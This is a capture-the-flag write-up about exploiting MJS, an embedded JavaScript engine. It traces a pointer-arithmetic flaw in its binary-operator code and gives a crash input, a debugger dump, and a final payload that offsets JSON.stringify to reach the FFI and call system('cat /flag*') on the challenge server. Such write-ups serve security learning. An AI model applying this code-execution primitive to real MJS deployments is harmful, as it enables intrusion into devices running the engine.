## Overview

This challenge is based around [MJS](https://github.com/cesanta/mjs), a Javascript engine for embedded devices.
We're provided with a handout, with relevant supporting files, the compiled binary, and a small patch file.
Looking through the patch, the author has disabled a bunch of functionality, but doesn't seem to have added any.
Thus, we're likely looking for a novel exploit across MJS more broadly, rather than in something targeted.

## MJS
As an open source project on Github, one of the first things I did was take a look at the open issues on the MJS project.
On my initial look, there's a large number of segfaults!

This was the first one that caught my eye: [link](https://github.com/cesanta/mjs/issues/230).  What stood out was the segfault on a large address, rather than just being a null pointer dereference.
```javascript
(JSON.stringify([1, 2, 3]))((JSON.stringify-6.34321e2)(JSON.stringify([1, 2, 3])));
```

Running it locally, I get the following GDB dump:

```
$rax   : 0x0000555555563b05  →  <frozen_cb+405> add BYTE PTR [rax], al
$rbx   : 0x0               
$rcx   : 0xfff2000000000000
$rdx   : 0x8               
$rsp   : 0x00007fffffffd6f8  →  0x000055555555bd86  →  <mjs_execute+3286> mov rdi, QWORD PTR [rbp-0x8]
$rbp   : 0x00007fffffffd9e0  →  0x00007fffffffdaa0  →  0x00007fffffffdaf0  →  0x00007fffffffdb30  →  0x0000000000000003
$rsi   : 0xfff2555555563b05
$rdi   : 0x00005555555812a0  →  0x0000000000000000
$rip   : 0x0000555555563b05  →  <frozen_cb+405> add BYTE PTR [rax], al
$r8    : 0x1               
$r9    : 0x00007fffffffd4c0  →  0x4008000000000000
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x00007fffffffdc48  →  0x00007fffffffdfce  →  "/home/b/ctfs/kalmar_23/mjs_win/mjs"
$r13   : 0x0000555555564020  →  <main+0> push rbp
$r14   : 0x000055555557fc78  →  0x0000555555556400  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →  0x00010102464c457f
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd6f8│+0x0000: 0x000055555555bd86  →  <mjs_execute+3286> mov rdi, QWORD PTR [rbp-0x8]	 ← $rsp
0x00007fffffffd700│+0x0008: 0x0000000000000000
0x00007fffffffd708│+0x0010: 0x0000000000000000
0x00007fffffffd710│+0x0018: 0x0000000000000000
0x00007fffffffd718│+0x0020: 0x0000000000000000
0x00007fffffffd720│+0x0028: 0x00007fffffffd760  →  0x00000004ffffd7a0
0x00007fffffffd728│+0x0030: 0x0000555555568098  →  <parse_bitwise_xor+168> cmp eax, 0x0
0x00007fffffffd730│+0x0038: 0x0000000055564020 ("@VU"?)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 → 0x555555563b05 <frozen_cb+405>  add    BYTE PTR [rax], al
   0x555555563b07 <frozen_cb+407>  add    bh, bh
   0x555555563b09 <frozen_cb+409>  dec    DWORD PTR [rax-0x77]
   0x555555563b0c <frozen_cb+412>  rex.RB enter 0x8be9, 0x0
   0x555555563b11 <frozen_cb+417>  add    BYTE PTR [rax], al
   0x555555563b13 <frozen_cb+419>  mov    rax, QWORD PTR [rbp-0x30]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mjs", stopped 0x555555563b05 in frozen_cb (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555563b05 → frozen_cb(data=0x5555555812a0, name=0x0, name_len=0x7fffffffda68, path=0x82 <error: Cannot access memory at address 0x82>, token=0x1d1d000000000000)
[#1] 0x55555555d9f4 → mjs_exec_internal(mjs=0x5555555812a0, path=0x7fffffffdff4 "./foo.js", src=0x555555582ca0 "(JSON.stringify([1, 2, 3]))((JSON.stringify-6.34321e2)(JSON.stringify([1, 2, 3])));\n\n", generate_jsc=0x0, res=0x7fffffffdac8)
[#2] 0x55555555daf2 → mjs_exec_file(mjs=0x5555555812a0, path=0x7fffffffdff4 "./foo.js", res=0x7fffffffdb10)
[#3] 0x5555555641d8 → main(argc=0x3, argv=0x7fffffffdc48)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

```

Furthermore, changing the floating point number in the initial POC changes what address it crashed at!
My initial intuition was that the program was doing math off of whatever pointer/structure tracked `JSON.stringify`.

## The Vuln
After some brief RE, I found the function that implements binary operations, copied below.  Notably, this confirms my belief that MJS was just doing path on the value that tracked `JSON.stringify`!

```C++
static mjs_val_t do_op(struct mjs *mjs, mjs_val_t a, mjs_val_t b, int op) {
  mjs_val_t ret = MJS_UNDEFINED;
  bool resnan = false;
  if ((mjs_is_foreign(a) || mjs_is_number(a)) &&
      (mjs_is_foreign(b) || mjs_is_number(b))) {
    int is_result_ptr = 0;
    double da, db, result;

    if (mjs_is_foreign(a) && mjs_is_foreign(b)) {
      /* When two operands are pointers, only subtraction is supported */
      if (op != TOK_MINUS) {
        mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "invalid operands");
      }
    } else if (mjs_is_foreign(a) || mjs_is_foreign(b)) {
      /*
       * When one of the operands is a pointer, only + and - are supported,
       * and the result is a pointer.
       */
      if (op != TOK_MINUS && op != TOK_PLUS) {
        mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "invalid operands");
      }
      is_result_ptr = 1;
    }
    da = mjs_is_number(a) ? mjs_get_double(mjs, a)
                          : (double) (uintptr_t) mjs_get_ptr(mjs, a);
    db = mjs_is_number(b) ? mjs_get_double(mjs, b)
                          : (double) (uintptr_t) mjs_get_ptr(mjs, b);
    result = do_arith_op(da, db, op, &resnan);
    if (resnan) {
      ret = MJS_TAG_NAN;
    } else {
      /*
       * If at least one of the operands was a pointer, result should also be
       * a pointer
       */
      ret = is_result_ptr ? mjs_mk_foreign(mjs, (void *) (uintptr_t) result)
                          : mjs_mk_number(mjs, result);
    }
  } else if (mjs_is_string(a) && mjs_is_string(b) && (op == TOK_PLUS)) {
    ret = s_concat(mjs, a, b);
  } else {
    set_no_autoconversion_error(mjs);
  }
  return ret;
}
```

## Putting it together
From here, we just need to find what we want to call, in a way that works with the MJS calling convention.
Thankfully, MJS normally provides an easy foreign function interface (FFI), allowing one to call C functions from Javascript!
While the initial patch prevented us from calling it directly, we can use our primitive to call it.
Some quick RE shows that the target function should be `mjs_ffi_call`.
From here, a quick script, and some debugging resulted in the following:

```bash
➜  nc 54.93.211.13 10002

Welcome to mjs.
Please give input. End with "EOF":

let json_addr =         0x555555563d80;
let ffi_addr =          0x555555560110;

let make_ffi = JSON.stringify - (json_addr - ffi_addr);

let win = make_ffi('int system(char *)');
let a = win('cat /flag*');
EOF
kalmar{mjs_brok3ey_565591da7d942fef817c}

```